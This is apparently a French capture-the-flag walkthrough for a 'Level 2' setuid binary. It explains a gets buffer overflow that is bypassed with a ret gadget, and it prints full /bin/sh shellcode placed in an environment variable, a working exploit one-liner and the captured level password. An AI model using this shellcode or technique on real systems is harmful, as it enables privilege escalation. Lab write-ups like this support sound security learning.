@@ -1,0 +1,71 @@
+# Level 2
+## Résumé
+Buffer overflow sur eip de return de la fonction p + 4 bytes après (vers adresse du shellcode) => ret (encore une fois) => appelle shellcode placé en variable d'environnement
+## Préambule
+```sh
+$> ls -l
+total 8
+-rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2
+$> file level2
+level2: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x0b5bb6cdcf572505f066c42f7be2fde7c53dc8bc, not stripped
+```
+Le home contient un binaire appartenant à l'user `level3` et avec un `suid`. On doit donc exploiter ce binaire pour pouvoir accéder au fichier `/home/user/level3/.pass`.
+
+On récupère le fichier `level2` sur la VM pour le désassembler avec `radare2` :
+```sh
+$> scp -P 4242 level2@10.11.200.192:/home/user/level2/level2 .
+$> r2 level2
+```
+
+## Analyse
+### Analyse du programme
+
+La fonction `main` appelle la fonction `p(uint32_t arg_4h)` (`call sym.p`).
+Dans la fonction `p`, il y a un appel à la fonction `gets`.
+Ensuite si l'EIP est une adresse commencant par un b (0xbyyyyyy). Alors la fonction affiche la chaine entrée et exit. 
+Cependant, si l'adresse dans EIP nest pas de la forme 0xbyyyyyyy, dans ce cas le programme suit son cours. C'est donc une sorte de securité sur l'EIP, cependant elle n'est pas présente sur l'adresse memoire precedante.
+
+Donc nous allons inserer un shellcode dans une variable d'environnement et nous servir du buffer overflow sur gets.
+ 
+Pour cela, nous remplacons l'eip par une instruction ret, ce qui aura pour effet de pop encore une fois eip, et c'est a cet endroit que nous placerons l'adresse de notre variable d'environnement. Celui-ci n'étant pas verifié par la fonction p.
+
+
+### Inserer shellcode: 
+export SHELLCODE=$(python -c 'print "\x31\xc0\x31\xdb\xb0\x17\xcd\x80" + 
+	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" + 
+	"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" +
+	"\x80\xe8\xdc\xff\xff\xff/bin/sh"')
+
+(voir site: http://disbauxes.upc.es/code/two-basic-ways-to-run-and-test-shellcode/)
+
+
+### Connaitre l'adresse d'une variable de l'environnement: (voir fonction getenv.c)
+./getenv SHELLCODE ./level2
+
+### Recherche de l'EIP
+Comme pour le level1, on trouve un offset de 80.
+
+Donc l'injection ressemblera a cela: A*80 + ADR(inst ret) + ADR(var SHELLCODE)
+
+
+
+## Application
+```sh
+(python -c 'print "A"*80 + "\x3e\x85\x04\x08" + "\xc1\xf8\xff\xbf"' ; echo 'cd ../level3 ; cat .pass') | ./level2
+
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
